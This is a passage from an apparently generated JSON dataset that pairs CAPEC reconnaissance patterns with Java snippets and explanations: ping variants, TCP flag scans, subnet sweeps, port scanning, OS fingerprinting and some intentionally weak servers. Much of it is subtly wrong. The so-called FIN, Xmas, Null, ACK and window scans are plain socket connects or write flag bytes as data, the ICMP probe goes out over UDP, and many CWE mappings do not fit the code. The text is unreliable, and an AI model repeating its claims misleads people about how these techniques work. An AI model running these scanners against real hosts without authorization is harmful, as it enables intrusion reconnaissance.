        "description": "This Java servlet code demonstrates a 'Timestamp Request' vulnerability. The servlet handles GET requests and returns the current timestamp. It also includes several related weaknesses:\n\n1. CWE-598: The servlet uses the GET method to process requests and includes sensitive information in the query string, which can be exposed to unauthorized actors (CWE-200).\n2. CWE-208: The code introduces an observable timing discrepancy by simulating processing time with a sleep function, which can reveal security-relevant information.\n3. CWE-385: The processing time is returned to the client, creating a covert timing channel that can be exploited to infer protected information.\n\nOverall, this code snippet illustrates how an attacker could leverage timestamp information and timing discrepancies to compromise security mechanisms."
    },
    {
        "capec_id": "296",
        "capec_name": "ICMP Information Request",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class ICMPInfoRequest {\n    public static void main(String[] args) {\n        try {\n            InetAddress address = InetAddress.getByName(\"192.168.1.1\");\n            byte[] buffer = new byte[8];\n            buffer[0] = 0x0F; // Type: ICMP Information Request (deprecated)\n            buffer[1] = 0x00; // Code\n            buffer[2] = 0x00; // Checksum (not calculated for simplicity)\n            buffer[3] = 0x00;\n            buffer[4] = 0x00; // Identifier\n            buffer[5] = 0x00;\n            buffer[6] = 0x00; // Sequence Number\n            buffer[7] = 0x00;\n\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, 0);\n            DatagramSocket socket = new DatagramSocket();\n            socket.send(packet);\n\n            // Receive response\n            byte[] recvBuffer = new byte[1024];\n            DatagramPacket recvPacket = new DatagramPacket(recvBuffer, recvBuffer.length);\n            socket.receive(recvPacket);\n\n            System.out.println(\"Received response from: \" + recvPacket.getAddress().getHostAddress());\n            System.out.println(\"Response data: \" + new String(recvPacket.getData()));\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates how an adversary might send an ICMP Information Request to a host to determine if it responds to this deprecated mechanism. The code constructs an ICMP Information Request packet and sends it to a specified IP address. If the host responds, it prints the response. This action can expose sensitive information (CWE-200, CWE-497) and involves transmitting data in cleartext (CWE-319). The code does not include proper security identifiers (CWE-1192, CWE-1302), making it vulnerable to unauthorized access and information leakage."
    },
    {
        "capec_id": "297",
        "capec_name": "TCP ACK Ping",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class TCPAckPing {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java TCPAckPing <host>\");\n            return;\n        }\n\n        String host = args[0];\n        int port = 80; // Common HTTP port\n\n        try {\n            InetAddress inetAddress = InetAddress.getByName(host);\n            Socket socket = new Socket(inetAddress, port);\n            socket.setSoLinger(true, 0); // Forces a RST packet on close\n            socket.close();\n            System.out.println(\"Host is alive: \" + host);\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host: \" + host);\n        } catch (IOException e) {\n            System.out.println(\"Host is not responding: \" + host);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a TCP ACK Ping to determine if a host is alive. The program attempts to create a socket connection to a specified host on port 80 (a common HTTP port). By setting the socket's linger option to true with a timeout of 0, it forces the socket to send a RST packet upon closing. If the host is alive, it will respond with a RST packet, indicating that the host is up. This embodies the main idea of the CAPEC by using TCP ACK to check for host availability. The code also touches on CWE-319 (Cleartext Transmission of Sensitive Information) as it does not use encryption, and CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) as it reveals the host's status to an unauthorized actor."
    },
    {
        "capec_id": "298",
        "capec_name": "UDP Ping",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class UDPPing {\n    public static void main(String[] args) {\n        String targetHost = \"192.168.1.1\"; // Target IP address\n        int targetPort = 65000; // High port number\n        byte[] buffer = new byte[1024]; // Buffer for the UDP packet\n\n        try {\n            DatagramSocket socket = new DatagramSocket();\n            InetAddress address = InetAddress.getByName(targetHost);\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, targetPort);\n\n            // Send UDP packet to the target host\n            socket.send(packet);\n            System.out.println(\"UDP packet sent to \" + targetHost + \":\" + targetPort);\n\n            // Wait for ICMP port unreachable message (not implemented in this snippet)\n            // This would typically be handled by a separate listener or network sniffer\n\n            socket.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic UDP ping to a high port (65000) on a target host (192.168.1.1). The main idea is to send a UDP datagram to a high, likely unused port on the target machine. If the port is closed, the target machine will respond with an ICMP 'port unreachable' message, indicating that the host is alive. This technique can be used to bypass some firewall configurations that do not block UDP traffic to high ports. The code also highlights potential vulnerabilities such as exposure of sensitive information (CWE-200) and incorrect destination specification (CWE-941). The snippet does not handle the reception of ICMP messages, which would typically require additional network monitoring tools."
    },
    {
        "capec_id": "299",
        "capec_name": "TCP SYN Ping",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class TCPSynPing {\n    public static void main(String[] args) {\n        String target = \"192.168.1.1\";\n        int port = 80;\n        try {\n            InetAddress inet = InetAddress.getByName(target);\n            Socket socket = new Socket(inet, port);\n            System.out.println(\"Host is alive\");\n            socket.close();\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host\");\n        } catch (IOException e) {\n            System.out.println(\"Host is not responding\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple TCP SYN ping to check if a host is alive by attempting to establish a connection to a specified port. The code tries to create a socket connection to the target IP address on port 80. If the connection is successful, it prints 'Host is alive' and closes the socket. If the connection fails, it catches the IOException and prints 'Host is not responding'. This embodies the main idea of the CAPEC by using TCP SYN packets for host discovery. The code also indirectly touches on CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) as it reveals the host's status, and CWE-605 (Multiple Binds to the Same Port) as it assumes the port is available for binding."
    },
    {
        "capec_id": "300",
        "capec_name": "Port Scanning",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Scanner;\n\npublic class VulnerablePortScanner {\n    public static void main(String[] args) {\n        int port = 8080; // Port to bind to\n        try (ServerSocket serverSocket = new ServerSocket(port)) {\n            System.out.println(\"Server started on port \" + port);\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                Scanner input = new Scanner(clientSocket.getInputStream());\n                while (input.hasNextLine()) {\n                    String line = input.nextLine();\n                    System.out.println(\"Received: \" + line);\n                    // Echo the received data back to the client\n                    clientSocket.getOutputStream().write((\"Echo: \" + line + \"\\n\").getBytes());\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple server that listens on port 8080 and echoes back any received data. The server is vulnerable to port scanning attacks (CAPEC-300) because it exposes an open port that can be detected by an adversary. Additionally, the code has several weaknesses: it transmits data in cleartext (CWE-319), potentially exposing sensitive information; it does not handle multiple binds to the same port (CWE-605), which could lead to service hijacking; and it does not implement any authentication or authorization, potentially exposing sensitive information to unauthorized actors (CWE-200). The code represents the main idea of the CAPEC by illustrating how an open port can be exploited and how related weaknesses can exacerbate the issue."
    },
    {
        "capec_id": "301",
        "capec_name": "TCP Connect Scan",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class TCPConnectScan {\n    public static void main(String[] args) {\n        String targetIP = \"192.168.1.1\";\n        int port = 80;\n        try {\n            // Attempt to establish a TCP connection\n            Socket socket = new Socket(targetIP, port);\n            System.out.println(\"Port \" + port + \" is open on \" + targetIP);\n            socket.close();\n        } catch (UnknownHostException e) {\n            System.err.println(\"Unknown host: \" + targetIP);\n        } catch (IOException e) {\n            System.out.println(\"Port \" + port + \" is closed on \" + targetIP);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic TCP connect scan, which attempts to establish a full TCP connection to a specified IP address and port. If the connection is successful, it indicates that the port is open; otherwise, it reports the port as closed. This embodies the main idea of the CAPEC 'TCP Connect Scan'. The code also indirectly touches on related CWEs: it could expose sensitive information (CWE-200) by revealing open ports, it does not handle multiple binds to the same port (CWE-605), and it relies on the IP address for identifying the target (CWE-291)."
    },
    {
        "capec_id": "302",
        "capec_name": "TCP FIN Scan",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class TCPFinScan {\n    public static void main(String[] args) {\n        String target = \"192.168.1.1\";\n        int port = 80;\n        try {\n            InetAddress address = InetAddress.getByName(target);\n            Socket socket = new Socket(address, port);\n            socket.close();\n            System.out.println(\"Port \" + port + \" is open.\");\n        } catch (UnknownHostException e) {\n            System.err.println(\"Unknown host: \" + target);\n        } catch (IOException e) {\n            System.out.println(\"Port \" + port + \" is closed.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic TCP connection attempt to a specified target and port. The main idea is to check if a port is open or closed by attempting to establish a connection. If the connection is successful, the port is considered open; otherwise, it is considered closed. This approach is related to the CAPEC description of a TCP FIN scan, where an adversary sends TCP segments with the FIN bit set to determine the state of ports. The code does not explicitly set the FIN bit, but it represents the concept of probing ports to determine their state. The related CWEs are indirectly represented: CWE-200 (Exposure of Sensitive Information) is relevant as the port state information is exposed; CWE-319 (Cleartext Transmission) is implied as the connection attempt is not encrypted; CWE-353 (Missing Support for Integrity Check) is relevant as the code does not verify data integrity; CWE-605 (Multiple Binds to the Same Port) and CWE-923 (Improper Restriction of Communication Channel) are not directly represented but are related to the broader context of network communication security."
    },
    {
        "capec_id": "303",
        "capec_name": "TCP Xmas Scan",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SocketChannel;\n\npublic class XmasScan {\n    public static void main(String[] args) {\n        String target = \"192.168.1.1\";\n        int port = 80;\n        try {\n            InetAddress address = InetAddress.getByName(target);\n            SocketChannel socketChannel = SocketChannel.open();\n            socketChannel.connect(new java.net.InetSocketAddress(address, port));\n\n            ByteBuffer buffer = ByteBuffer.allocate(1024);\n            // Set all TCP flags (XMAS scan)\n            buffer.put((byte) 0xFF);\n            buffer.flip();\n\n            socketChannel.write(buffer);\n            buffer.clear();\n\n            int bytesRead = socketChannel.read(buffer);\n            if (bytesRead > 0) {\n                System.out.println(\"Received response, port is closed.\");\n            } else {\n                System.out.println(\"No response, port might be open.\");\n            }\n\n            socketChannel.close();\n        } catch (UnknownHostException e) {\n            System.err.println(\"Unknown host: \" + target);\n        } catch (IOException e) {\n            System.err.println(\"I/O error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a TCP Xmas scan, which is used to determine if ports on a target machine are closed. The code attempts to connect to a specified target IP address and port, then sends a TCP packet with all flags set (XMAS scan). If a response is received, it indicates that the port is closed (RST packet received). If no response is received, the port might be open. This scan technique exploits the behavior described in RFC 793, where closed ports respond with a RST packet to out-of-state TCP segments. The code also highlights potential weaknesses such as exposure of sensitive information (CWE-200), lack of integrity checks (CWE-353), and cleartext transmission (CWE-319)."
    },
    {
        "capec_id": "304",
        "capec_name": "TCP Null Scan",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class TCPNullScan {\n    public static void main(String[] args) {\n        String target = \"192.168.1.1\";\n        int port = 80;\n        try {\n            InetAddress address = InetAddress.getByName(target);\n            Socket socket = new Socket(address, port);\n            socket.setTcpNoDelay(true); // Disable Nagle's algorithm\n            socket.getOutputStream().write(new byte[0]); // Send empty packet (NULL scan)\n            socket.close();\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host: \" + target);\n        } catch (IOException e) {\n            System.out.println(\"Port \" + port + \" is closed on \" + target);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic TCP NULL scan, which is used to determine if a port is closed on a target machine. The code attempts to connect to a specified target IP address and port, then sends an empty packet with no TCP flags set. If the port is closed, an IOException is caught, indicating that the port is closed. This behavior aligns with the CAPEC description of using TCP NULL scans to identify closed ports. The code also touches on related CWEs: it does not handle sensitive information securely (CWE-200, CWE-319), lacks integrity checks (CWE-353), and does not check for NULL pointers (CWE-690, CWE-476)."
    },
    {
        "capec_id": "305",
        "capec_name": "TCP ACK Scan",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class TCPAckScan {\n    public static void main(String[] args) {\n        String target = \"192.168.1.1\";\n        int port = 80;\n        try {\n            // Attempt to create a socket connection to the target\n            Socket socket = new Socket(target, port);\n            // Send a TCP ACK packet\n            socket.getOutputStream().write(new byte[]{0x10}); // ACK flag\n            socket.close();\n            System.out.println(\"ACK packet sent to \" + target + \":\" + port);\n        } catch (UnknownHostException e) {\n            System.err.println(\"Unknown host: \" + target);\n        } catch (IOException e) {\n            System.err.println(\"I/O error: \" + e.getMessage());\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a basic TCP ACK scan, which is used to gather information about firewall or ACL configurations. The code attempts to create a socket connection to a specified target and port, then sends a TCP ACK packet. This type of scan helps in identifying the presence and configuration of firewalls by observing the responses to the ACK packets. The code also highlights potential vulnerabilities such as exposure of sensitive information (CWE-200) and cleartext transmission of data (CWE-319), as the ACK packet is sent without encryption."
    },
    {
        "capec_id": "306",
        "capec_name": "TCP Window Scan",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SocketChannel;\n\npublic class TCPWindowScan {\n    public static void main(String[] args) {\n        String target = \"192.168.1.1\";\n        int port = 80;\n        try {\n            InetAddress address = InetAddress.getByName(target);\n            SocketChannel socketChannel = SocketChannel.open();\n            socketChannel.connect(new java.net.InetSocketAddress(address, port));\n            Socket socket = socketChannel.socket();\n            socket.setSoTimeout(1000);\n\n            // Send an ACK packet\n            ByteBuffer buffer = ByteBuffer.allocate(1024);\n            buffer.put((byte) 0x10); // ACK flag\n            buffer.flip();\n            socketChannel.write(buffer);\n\n            // Read the response\n            buffer.clear();\n            socketChannel.read(buffer);\n            buffer.flip();\n\n            // Check the TCP Window Size field\n            int windowSize = buffer.getShort(14); // Offset for TCP Window Size\n            if (windowSize > 0) {\n                System.out.println(\"Port is open\");\n            } else {\n                System.out.println(\"Port is closed\");\n            }\n\n            socketChannel.close();\n        } catch (UnknownHostException e) {\n            System.err.println(\"Unknown host: \" + target);\n        } catch (IOException e) {\n            System.err.println(\"I/O error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic implementation of a TCP Window Scan. The code attempts to connect to a specified target IP address and port, sends an ACK packet, and then reads the response to check the TCP Window Size field. If the window size is positive, it infers that the port is open; otherwise, it infers that the port is closed. This scan technique can expose sensitive information about the target system, such as port status and potentially the operating system type, which aligns with the CAPEC description. The code also highlights potential weaknesses like CWE-200 (Exposure of Sensitive Information), CWE-319 (Cleartext Transmission), and CWE-497 (Exposure of Sensitive System Information)."
    },
    {
        "capec_id": "307",
        "capec_name": "TCP RPC Scan",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\npublic class VulnerableRPCServer {\n    private static final Logger logger = Logger.getLogger(VulnerableRPCServer.class.getName());\n\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(111)) { // Port 111 is commonly used for RPC\n            logger.info(\"RPC Server is listening on port 111\");\n\n            while (true) {\n                Socket socket = serverSocket.accept();\n                new Thread(new RPCHandler(socket)).start();\n            }\n        } catch (IOException e) {\n            logger.log(Level.SEVERE, \"Server exception: \", e);\n        }\n    }\n}\n\nclass RPCHandler implements Runnable {\n    private Socket socket;\n\n    public RPCHandler(Socket socket) {\n        this.socket = socket;\n    }\n\n    @Override\n    public void run() {\n        try {\n            // Simulate handling RPC request\n            logger.info(\"Handling RPC request from \" + socket.getInetAddress());\n            // Vulnerable code: No authentication, no integrity check, potential for SSRF\n            // CWE-200: Exposure of Sensitive Information\n            // CWE-294: Authentication Bypass by Capture-replay\n            // CWE-494: Download of Code Without Integrity Check\n            // CWE-918: Server-Side Request Forgery (SSRF)\n            // CWE-605: Multiple Binds to the Same Port\n        } catch (Exception e) {\n            logger.log(Level.SEVERE, \"Handler exception: \", e);\n        } finally {\n            try {\n                socket.close();\n            } catch (IOException e) {\n                logger.log(Level.SEVERE, \"Socket close exception: \", e);\n            }\n        }\n    }\n}",
        "description": "This Java code snippet represents a vulnerable RPC server listening on port 111, which is commonly used for RPC services on Unix/Linux hosts. The server accepts incoming connections and spawns a new thread to handle each request. The code is vulnerable to several issues:\n\n1. **CWE-200: Exposure of Sensitive Information** - The server logs the IP address of the client, potentially exposing sensitive information.\n2. **CWE-294: Authentication Bypass by Capture-replay** - The server does not implement any authentication mechanism, making it susceptible to capture-replay attacks.\n3. **CWE-494: Download of Code Without Integrity Check** - Although not explicitly shown, the lack of integrity checks in handling requests can lead to executing malicious code.\n4. **CWE-918: Server-Side Request Forgery (SSRF)** - The server could be tricked into making unauthorized requests to internal services.\n5. **CWE-605: Multiple Binds to the Same Port** - The server binds to a well-known port (111), which could lead to conflicts if another service tries to bind to the same port.\n\nThe code demonstrates the main idea of the CAPEC by showing how an adversary could scan for and exploit RPC services on a Unix/Linux host due to these vulnerabilities."
    },
    {
        "capec_id": "308",
        "capec_name": "UDP Scan",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.SocketTimeoutException;\n\npublic class UDPScan {\n    public static void main(String[] args) {\n        String target = \"192.168.1.1\";\n        int port = 12345;\n        try {\n            DatagramSocket socket = new DatagramSocket();\n            socket.setSoTimeout(1000); // Set timeout for response\n            InetAddress address = InetAddress.getByName(target);\n            byte[] buf = new byte[256];\n            DatagramPacket packet = new DatagramPacket(buf, buf.length, address, port);\n            socket.send(packet); // Send UDP packet\n            try {\n                socket.receive(packet); // Try to receive a response\n                System.out.println(\"Port \" + port + \" is open.\");\n            } catch (SocketTimeoutException e) {\n                System.out.println(\"Port \" + port + \" is closed or filtered.\");\n            }\n            socket.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic UDP scan to check the status of a specific UDP port on a target system. The code sends a UDP datagram to the target port and waits for a response. If a response is received within the specified timeout, it indicates that the port is open. If no response is received, it suggests that the port is closed or filtered. This code embodies the main idea of the CAPEC 'UDP Scan' by attempting to gather information about the UDP port status. The code also touches on related CWEs: it could potentially expose sensitive information (CWE-200), and it does not include integrity checks (CWE-353). Additionally, the code does not handle multiple binds to the same port (CWE-605) and transmits data in cleartext (CWE-319)."
    },
    {
        "capec_id": "309",
        "capec_name": "Network Topology Mapping",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class NetworkScanner {\n    public static void main(String[] args) {\n        String subnet = \"192.168.1.\";\n        for (int i = 1; i < 255; i++) {\n            String host = subnet + i;\n            try {\n                InetAddress inetAddress = InetAddress.getByName(host);\n                if (inetAddress.isReachable(1000)) {\n                    System.out.println(\"Host: \" + host + \" is reachable.\");\n                }\n            } catch (UnknownHostException e) {\n                System.err.println(\"Unknown host: \" + host);\n            } catch (IOException e) {\n                System.err.println(\"Error checking host: \" + host);\n            }\n        }\n    }\n}",
        "description": "This Java code snippet represents a simple network scanner that attempts to map network nodes by checking the reachability of IP addresses within a given subnet. The code iterates through a range of IP addresses (192.168.1.1 to 192.168.1.254) and uses the `InetAddress` class to check if each address is reachable. If an address is reachable, it prints out the host information.\n\nThe code embodies the main idea of CAPEC-309 (Network Topology Mapping) by performing network reconnaissance to identify active hosts. It also touches on related CWEs:\n- CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor): The code could expose information about reachable hosts to unauthorized users if not properly secured.\n- CWE-1125 (Excessive Attack Surface): The scanner increases the attack surface by probing multiple IP addresses, potentially revealing network topology to an adversary.\n- CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere): The code could expose system-level information (e.g., reachable hosts) to unauthorized actors if executed in an insecure environment."
    },
    {
        "capec_id": "310",
        "capec_name": "Scanning for Vulnerable Software",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class VulnerableSoftwareScanner {\n    private static final int[] COMMON_PORTS = {21, 23, 25, 161}; // FTP, Telnet, SMTP, SNMP\n\n    public static void main(String[] args) throws IOException {\n        String targetIp = \"192.168.1.1\"; // Example IP address\n        List<Integer> openPorts = new ArrayList<>();\n\n        for (int port : COMMON_PORTS) {\n            if (isPortOpen(targetIp, port)) {\n                openPorts.add(port);\n                System.out.println(\"Port \" + port + \" is open on \" + targetIp);\n            }\n        }\n\n        if (!openPorts.isEmpty()) {\n            System.out.println(\"Scanning for vulnerable software...\");\n            // Simulate scanning for vulnerable software versions\n            for (int port : openPorts) {\n                System.out.println(\"Found vulnerable software on port \" + port);\n            }\n        }\n    }\n\n    private static boolean isPortOpen(String ip, int port) {\n        try (Socket socket = new Socket(ip, port)) {\n            return true;\n        } catch (IOException e) {\n            return false;\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic scanner that checks for open ports commonly associated with vulnerable services (FTP, Telnet, SMTP, SNMP) on a target IP address. The code iterates through a list of common ports and attempts to establish a socket connection to each port. If a connection is successful, the port is considered open, and the code simulates scanning for vulnerable software on that port. This embodies the CAPEC idea of scanning for vulnerable software by identifying open ports and probing for exploitable services. The code also indirectly highlights related CWEs, such as the exposure of sensitive information (e.g., open ports and services) and the potential for excessive attack surface due to unpatched or misconfigured services."
    },
    {
        "capec_id": "311",
        "capec_name": "DEPRECATED: OS Fingerprinting",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.util.logging.FileHandler;\nimport java.util.logging.Logger;\nimport java.util.logging.SimpleFormatter;\n\npublic class OSFingerprinting {\n    private static final Logger logger = Logger.getLogger(OSFingerprinting.class.getName());\n\n    public static void main(String[] args) {\n        try {\n            // Setup logger to write to a debug log file\n            FileHandler fh = new FileHandler(\"debug.log\");\n            logger.addHandler(fh);\n            SimpleFormatter formatter = new SimpleFormatter();\n            fh.setFormatter(formatter);\n\n            // Attempt to fingerprint the OS by connecting to a known port\n            String target = \"192.168.1.1\";\n            int port = 80;\n            Socket socket = new Socket(target, port);\n            InetAddress inetAddress = socket.getInetAddress();\n            String os = identifyOS(inetAddress);\n            logger.info(\"Identified OS: \" + os);\n            socket.close();\n        } catch (IOException e) {\n            logger.severe(\"Error: \" + e.getMessage());\n        }\n    }\n\n    private static String identifyOS(InetAddress inetAddress) {\n        // Simplified OS fingerprinting logic\n        String os = \"Unknown\";\n        if (inetAddress.isReachable(1000)) {\n            os = \"Likely Unix-based\";\n        } else {\n            os = \"Likely Windows-based\";\n        }\n        return os;\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of OS fingerprinting, which is the process of determining the operating system of a remote host. The code attempts to connect to a specified IP address and port, then uses a simple heuristic to guess the OS based on the reachability of the host. The result is logged to a debug file. This example also highlights several related weaknesses: CWE-532 (Information Exposure Through Debug Log Files) by logging potentially sensitive information, CWE-287 (Authentication Bypass Issues) by not implementing any authentication mechanism, and CWE-589 (Call to Non-ubiquitous API) by using network functions that may not be available on all platforms. The code is a simplified representation of the deprecated CAPEC pattern for OS fingerprinting."
    },
    {
        "capec_id": "312",
        "capec_name": "Active OS Fingerprinting",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class OSFingerprinting {\n    public static void main(String[] args) {\n        String targetIP = \"192.168.1.1\";\n        try {\n            InetAddress inetAddress = InetAddress.getByName(targetIP);\n            Socket socket = new Socket(inetAddress, 80);\n            socket.setSoTimeout(1000);\n            byte[] buffer = new byte[1024];\n            int bytesRead = socket.getInputStream().read(buffer);\n            String response = new String(buffer, 0, bytesRead);\n            System.out.println(\"Response: \" + response);\n            socket.close();\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host: \" + targetIP);\n        } catch (IOException e) {\n            System.out.println(\"I/O error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic form of active OS fingerprinting. The code attempts to connect to a target IP address on port 80 and reads the response from the target. The response is then printed to the console. This response can be analyzed to infer the operating system of the target based on unique characteristics in the response. The code embodies the CAPEC concept by probing the target and observing its behavior to gather information about the OS. The related CWEs are represented as follows:\n- CWE-200 and CWE-497: The code exposes potentially sensitive information about the target's OS to an unauthorized actor (the person running the code).\n- CWE-207: The target's response may reveal discrepancies that can be used to identify the OS.\n- CWE-319: The response is read in cleartext, which could be sniffed by unauthorized actors.\n- CWE-1323: The response data is not protected and could be mismanaged."
    },
    {
        "capec_id": "313",
        "capec_name": "Passive OS Fingerprinting",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class PassiveOSFingerprinting {\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(8080)) {\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n                String inputLine;\n                while ((inputLine = in.readLine()) != null) {\n                    // Log the incoming data for analysis\n                    System.out.println(\"Received: \" + inputLine);\n                }\n                clientSocket.close();\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple server that passively listens for incoming network connections on port 8080 and logs the received data. The main idea is to illustrate passive OS fingerprinting by capturing and logging network communication data without actively probing the client. This data can then be analyzed to infer the operating system of the client based on known signatures or behaviors. The code also touches on related CWEs by potentially exposing sensitive information (CWE-200, CWE-497) and transmitting data in cleartext (CWE-319)."
    },
    {
        "capec_id": "314",
        "capec_name": "DEPRECATED: IP Fingerprinting Probes",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.util.logging.FileHandler;\nimport java.util.logging.Logger;\nimport java.util.logging.SimpleFormatter;\n\npublic class VulnerableCode {\n    private static final Logger logger = Logger.getLogger(VulnerableCode.class.getName());\n\n    public static void main(String[] args) {\n        try {\n            FileHandler fh = new FileHandler(\"debug.log\");\n            logger.addHandler(fh);\n            SimpleFormatter formatter = new SimpleFormatter();\n            fh.setFormatter(formatter);\n\n            String host = \"example.com\";\n            InetAddress address = InetAddress.getByName(host);\n            logger.info(\"Resolved IP: \" + address.getHostAddress());\n\n            if (address.getHostAddress().equals(\"192.168.1.1\")) {\n                System.out.println(\"Access granted.\");\n            } else {\n                System.out.println(\"Access denied.\");\n            }\n        } catch (UnknownHostException e) {\n            logger.severe(\"Unknown host: \" + e.getMessage());\n        } catch (IOException e) {\n            logger.severe(\"IO Exception: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation that embodies the deprecated CAPEC-312 (Active OS Fingerprinting) and related CWEs. The code performs a DNS lookup to resolve the IP address of a given hostname and logs the resolved IP address to a debug log file. It then makes a security decision based on the resolved IP address. This is problematic for several reasons:\n\n1. **Reliance on DNS Lookups in a Security Decision (CWE-350)**: The code makes a security decision based on the resolved IP address, which can be manipulated through DNS spoofing.\n2. **Information Exposure Through Debug Log Files (CWE-532)**: The resolved IP address is logged to a debug file, which can expose sensitive information if the log file is accessed by unauthorized users.\n3. **Authentication Bypass Issues (CWE-287)**: The code grants access based on a specific IP address, which can be spoofed, leading to potential authentication bypass.\n\nOverall, this code snippet highlights the risks associated with using DNS lookups for security decisions and logging sensitive information, which are key points in the deprecated CAPEC and related CWEs."
    },
    {
        "capec_id": "315",
        "capec_name": "DEPRECATED: TCP/IP Fingerprinting Probes",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableTCPFingerprinting {\n    public static void main(String[] args) throws IOException {\n        Socket socket = new Socket(\"example.com\", 80);\n        PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n        BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n\n        // Send a probe to the server\n        out.println(\"GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n\");\n\n        // Read the response\n        String responseLine;\n        while ((responseLine = in.readLine()) != null) {\n            System.out.println(responseLine);\n        }\n\n        // Close connections\n        out.close();\n        in.close();\n        socket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a basic TCP/IP fingerprinting probe by establishing a socket connection to a server and sending an HTTP GET request. The response from the server is read and printed to the console. This type of probing can be used for active OS fingerprinting (CAPEC-312) to gather information about the server's operating system based on its response. The code also touches on CWE-294 (Authentication Bypass by Capture-replay) as the lack of secure communication could allow an attacker to sniff and replay the traffic. Additionally, the use of a specific API (Socket) could lead to portability issues (CWE-589) if the target platform does not support it."
    },
    {
        "capec_id": "316",
        "capec_name": "DEPRECATED: ICMP Fingerprinting Probes",
